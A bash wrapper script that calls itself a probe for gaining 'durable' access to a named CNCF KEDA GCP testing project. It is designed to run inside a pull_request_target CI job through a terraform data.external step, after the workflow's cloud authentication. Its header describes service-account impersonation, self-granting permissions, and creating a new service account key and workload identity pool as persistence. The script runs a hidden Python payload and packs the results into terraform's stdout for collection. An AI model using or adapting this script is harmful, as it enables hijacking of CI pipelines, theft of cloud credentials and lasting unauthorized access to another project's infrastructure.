#!/usr/bin/env bash
# c211-i122266 probe: durable GCP unlock on cncf-keda-testing 575508414076.
# Runs inside the pull_request_target 'Validate PR' terraform data.external step
# AFTER google-github-actions/auth@v3. Stdlib REST: STS + SA impersonation,
# durable-permission measurement, minimal self-grant, nonce SA + RSA-2048 key
# (RSA-OAEP chunked ciphertext only), nonce WIF pool + provider + binding,
# quota/offering matrix. Emits ONE json object on stdout (terraform contract).
set +e
RAW="${C211_DURABLE_RAW:-/tmp/c211_i122266_raw.txt}"
export C211_DURABLE_RAW="$RAW"
: > "$RAW"
cd "$(dirname "$0")" 2>/dev/null
python3 ./gcp_durable.py run >>"$RAW" 2>&1
rc=$?
printf '%s\n' "PROBE_EXIT=$rc" >> "$RAW"
python3 - "$RAW" <<'PYEOF'
import json, sys
raw = open(sys.argv[1], encoding='utf-8', errors='replace').read()
sections, cur, buf = {}, 'header', []
for line in raw.splitlines():
    if line.startswith('== ') and line.rstrip().endswith(' =='):
        if buf:
            sections[cur] = '\n'.join(buf); buf = []
        cur = line.strip().strip('=').strip()
    else:
        buf.append(line)
if buf:
    sections[cur] = '\n'.join(buf)
out, seen = {}, {}
for k, v in sections.items():
    key = k.replace(' ', '_').replace('/', '_').replace('(', '').replace(')', '')
    key = key.replace('--', '').replace('__', '_')[:64] or 'section'
    if key in seen:
        seen[key] += 1; key = '%s#%d' % (key[:60], seen[key])
    else:
        seen[key] = 0
    out[key] = v[:60000]
print(json.dumps(out))
PYEOF
exit 0
